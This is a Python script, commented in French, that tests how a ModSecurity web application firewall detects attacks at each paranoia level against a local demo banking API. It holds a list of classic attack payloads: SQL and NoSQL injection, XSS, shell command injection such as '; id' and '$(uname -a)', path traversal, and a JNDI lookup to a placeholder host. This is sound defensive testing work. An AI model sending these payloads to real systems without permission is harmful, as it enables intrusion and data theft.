#!/usr/bin/env python3
"""Mesure du niveau de paranoïa du WAF (bibliothèque standard uniquement) : faux positifs et détection, PL1 à PL4.

Méthode (docs/securite/revue-durcissement.md, § 5) : le WAF tourne en DetectionOnly avec toutes les règles jusqu'au
PL4 évaluées (rien n'est bloqué, donc ni WafAttackBlocked ni blocage d'IP) ; le verdict de chaque requête à chaque
niveau est recalculé depuis son journal d'audit : score entrant = somme des règles de niveau <= N (CRITICAL 5,
ERROR 4, WARNING 3, NOTICE 2), bloquée si score >= 5 (ANOMALY_INBOUND) ; règles de réponse (95x) à part, seuil 4.

Sous-commandes :
  analyze             lit le journal du WAF sur stdin, affiche par niveau les requêtes qui auraient été bloquées
                      et les règles déclenchées (avec un extrait de la donnée en cause)
  payloads --target   envoie un jeu élargi de charges d'attaque classiques (SQLi, XSS, RCE, traversée, divers),
                      inoffensives pour la stack, chacune marquée ?case=<n>
  verdicts            lit le journal du WAF sur stdin et donne, pour chaque charge de `payloads`, le premier niveau
                      qui la bloque ; --exclude 920350,… simule le retrait de règles

Exemples :
  docker logs --since 10m resilience-alpha-waf-1 2>&1 | python3 scripts/scenarios/waf_paranoia.py analyze
  python3 scripts/scenarios/waf_paranoia.py payloads --target http://127.0.0.1:8088
  docker logs --since 2m resilience-alpha-waf-1 2>&1 | python3 scripts/scenarios/waf_paranoia.py verdicts
"""

import argparse
import collections
import json
import re
import sys
import urllib.error
import urllib.parse
import urllib.request

POINTS = {"2": 5, "3": 4, "4": 3, "5": 2}          # sévérité ModSecurity -> points d'anomalie CRS
EVALUATION = re.compile(r"^9(49|59|80)\d{3}$")       # règles d'évaluation et de corrélation : ne comptent pas
IN_THRESHOLD, OUT_THRESHOLD = 5, 4
LEVELS = (1, 2, 3, 4)
# La donnée en cause peut contenir un mot de passe (corps JSON, ARGS:json.<champ>) : toute valeur d'un champ dont le
# nom contient « pass » est masquée à l'affichage
SECRET_VALUE = re.compile(r'("[^"]*pass[^"]*"\s*:\s*")[^"]*|(json\.\w*pass\w*:\s*)\S+', re.IGNORECASE)
# Nom du champ secret de l'API d'authentification, porteur des charges d'injection ci-dessous
CREDENTIAL_FIELD = "password"

QUERY = {
    "sqli": ["1' OR '1'='1", "1 UNION SELECT null,null--", "1/**/UNION/**/SELECT/**/1", "admin'#", "1 AND SLEEP(5)",
             "1' AND extractvalue(1,concat(0x7e,version()))--", "1;SELECT pg_sleep(5)", "' OR 1=1 LIMIT 1 -- -",
             "1' || '1'='1", "1 OR 2>1", "x' AND 1=(SELECT COUNT(*) FROM accounts)--", ";DROP TABLE transfers",
             "1'/**/oR/**/'a'='a", "1 aNd 1=1", "'+(select 1)+'", "1 having 1=1"],
    "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "javascript:alert(1)",
            "\"><iframe src=javascript:alert(1)>", "<details open ontoggle=alert(1)>",
            "<a href=\"jav&#x09;ascript:alert(1)\">x</a>", "<body onpageshow=alert(1)>", "'-alert(1)-'",
            "<math><mtext></mtext></math>"],
    "rce": [";id", "| whoami", "$(uname -a)", "`sleep 5`", "&& ping -c 1 127.0.0.1", "; cat${IFS}x"],
    "traversee": ["../../../../", "..%2f..%2f..%2f", "....//....//....//", "..\\..\\..\\"],
    "divers": ["{{7*7}}", "${jndi:ldap://x/a}", "<!--#exec cmd=\"ls\" -->", "%00", "<?php echo 1; ?>"],
}
JSON_BODIES = [
    ("sqli-json", "/api/auth/login", {"email": "admin@resilience.local' OR '1'='1", CREDENTIAL_FIELD: "x"}),
    ("sqli-json", "/api/auth/login", {"email": "a@b.fr", CREDENTIAL_FIELD: "' OR 1=1--"}),
    ("sqli-json", "/api/payments/transfers", {"to_account_number": "RA0000000001", "amount_cents": 100,
                                             "label": "1 UNION SELECT balance_cents FROM accounts"}),
    ("xss-json", "/api/auth/register", {"email": "x@y.fr", "full_name": "<script>alert(1)</script>", CREDENTIAL_FIELD: "x"}),
    ("xss-json", "/api/payments/transfers", {"to_account_number": "RA0000000001", "amount_cents": 100,
                                            "label": "<img src=x onerror=alert(1)>"}),
    ("nosql-json", "/api/auth/login", {"email": {"$gt": ""}, CREDENTIAL_FIELD: {"$ne": None}}),
]


def cases():
    # Cette méthode permet de construire la liste ordonnée des charges : (n°, famille, méthode, chemin, corps).
    out, n = [], 0
    for family, payloads in QUERY.items():
        for payload in payloads:
            n += 1
            out.append((n, family, "GET", f"/api/payments/accounts?case={n}&q=" + urllib.parse.quote(payload, safe=""),
                        None, payload))
    for family, path, body in JSON_BODIES:
        n += 1
        out.append((n, family, "POST", f"{path}?case={n}", body, json.dumps(body, ensure_ascii=False)))
    return out


def transactions(stream):
    # Cette méthode permet d'extraire les transactions du journal d'audit JSON (une ligne par transaction).
    for line in stream:
        if '"transaction"' not in line:
            continue
        try:
            yield json.loads(line[line.index("{"):])["transaction"]
        except (ValueError, KeyError):
            continue


def scores(transaction, excluded=frozenset()):
    # Cette méthode permet de calculer les points entrants et sortants par niveau, et la liste des règles déclenchées.
    inbound, outbound, hits = collections.Counter(), collections.Counter(), []
    for message in transaction.get("messages", []):
        details = message["details"]
        rule = details["ruleId"]
        if EVALUATION.match(rule) or rule in excluded:
            continue
        level = next((int(t.rsplit("/", 1)[1]) for t in details.get("tags", []) if t.startswith("paranoia-level/")), 1)
        (outbound if rule.startswith("95") else inbound)[level] += POINTS.get(details.get("severity"), 0)
        hits.append((rule, level, message["message"], details.get("data", "")))
    return inbound, outbound, hits


def blocked_from(inbound, outbound):
    # Cette méthode permet de donner le premier niveau auquel la requête aurait été bloquée (None si aucun).
    for level in LEVELS:
        if (sum(v for k, v in inbound.items() if k <= level) >= IN_THRESHOLD
                or sum(v for k, v in outbound.items() if k <= level) >= OUT_THRESHOLD):
            return level
    return None


def analyze(args):
    # Cette méthode permet de compter, par niveau, les requêtes qui auraient été bloquées et les règles en cause.
    excluded = frozenset(filter(None, args.exclude.split(",")))
    total, blocked = 0, {level: [] for level in LEVELS}
    rules = collections.defaultdict(lambda: {"count": 0, "level": 1, "message": "", "examples": []})
    for t in transactions(sys.stdin):
        total += 1
        inbound, outbound, hits = scores(t, excluded)
        first = blocked_from(inbound, outbound)
        request = t.get("request", {})
        for level in LEVELS:
            if first is not None and first <= level:
                blocked[level].append((request.get("method"), request.get("uri", "")[:90], t.get("client_ip"),
                                       sorted({h[0] for h in hits if h[1] <= level})))
        for rule, level, message, data in hits:
            entry = rules[rule]
            entry["count"] += 1
            entry["level"], entry["message"] = level, message[:80]
            if len(entry["examples"]) < 3:
                shown = SECRET_VALUE.sub(lambda m: (m.group(1) or m.group(2)) + "***", data)
                entry["examples"].append(f"{request.get('method')} {request.get('uri', '')[:60]} :: {shown[:80]}")
    print(f"transactions journalisées : {total}")
    for level in LEVELS:
        print(f"PL{level} : {len(blocked[level])} requête(s) bloquée(s)")
        for method, uri, ip, hit in blocked[level][:args.show]:
            print(f"   - {method} {uri} ip={ip} règles={hit}")
    print("règles déclenchées :")
    for rule, entry in sorted(rules.items(), key=lambda kv: -kv[1]["count"]):
        print(f"  {rule} PL{entry['level']} x{entry['count']} — {entry['message']}")
        for example in entry["examples"]:
            print(f"       {example}")


def payloads(args):
    # Cette méthode permet d'envoyer le jeu élargi de charges, chacune marquée ?case=<n>, et d'afficher les réponses.
    target = args.target.rstrip("/")
    for n, family, method, path, body, payload in cases():
        request = urllib.request.Request(target + path, method=method,
                                         data=json.dumps(body).encode() if body is not None else None,
                                         headers={"Content-Type": "application/json", "Accept": "application/json"})
        try:
            with urllib.request.urlopen(request, timeout=10) as response:
                status = response.status
        except urllib.error.HTTPError as err:
            status = err.code
        except OSError:
            status = 0
        print(f"case {n:2} {family:10} {status} {payload[:60]!r}")


def verdicts(args):
    # Cette méthode permet de donner, pour chaque charge du jeu, le premier niveau qui l'aurait bloquée.
    excluded = frozenset(filter(None, args.exclude.split(",")))
    seen = {}
    for t in transactions(sys.stdin):
        match = re.search(r"[?&]case=(\d+)", t.get("request", {}).get("uri", ""))
        if match:
            inbound, outbound, hits = scores(t, excluded)
            seen[int(match.group(1))] = (blocked_from(inbound, outbound), sorted({h[0] for h in hits}))
    families = collections.defaultdict(collections.Counter)
    for n, family, _, _, _, payload in cases():
        first, hits = seen.get(n, (None, []))
        families[family]["charges"] += 1
        for level in LEVELS:
            families[family][level] += first is not None and first <= level
        print(f"case {n:2} {family:10} bloquée dès PL{first or '-'} : {payload[:60]!r} {hits}")
    print("\n| famille | charges | PL1 | PL2 | PL3 | PL4 |\n|---|---|---|---|---|---|")
    total = collections.Counter()
    for family, counts in families.items():
        total.update(counts)
        print(f"| {family} | {counts['charges']} | " + " | ".join(str(counts[level]) for level in LEVELS) + " |")
    print(f"| total | {total['charges']} | " + " | ".join(str(total[level]) for level in LEVELS) + " |")


def main():
    # Cette méthode permet de lancer la sous-commande demandée.
    parser = argparse.ArgumentParser(description="Mesure du niveau de paranoïa du WAF (faux positifs et détection).")
    sub = parser.add_subparsers(dest="command", required=True)
    a = sub.add_parser("analyze", help="journal du WAF sur stdin : requêtes bloquées par niveau, règles déclenchées")
    a.add_argument("--exclude", default="", help="règles à ignorer (simulation d'exclusion), séparées par des virgules")
    a.add_argument("--show", type=int, default=8, help="nombre de requêtes bloquées affichées par niveau")
    p = sub.add_parser("payloads", help="envoie le jeu élargi de charges d'attaque")
    p.add_argument("--target", required=True, help="URL du WAF, ex. http://127.0.0.1:8088")
    v = sub.add_parser("verdicts", help="journal du WAF sur stdin : premier niveau bloquant chaque charge")
    v.add_argument("--exclude", default="", help="règles à ignorer (simulation d'exclusion), séparées par des virgules")
    args = parser.parse_args()
    {"analyze": analyze, "payloads": payloads, "verdicts": verdicts}[args.command](args)
    return 0


if __name__ == "__main__":
    sys.exit(main())
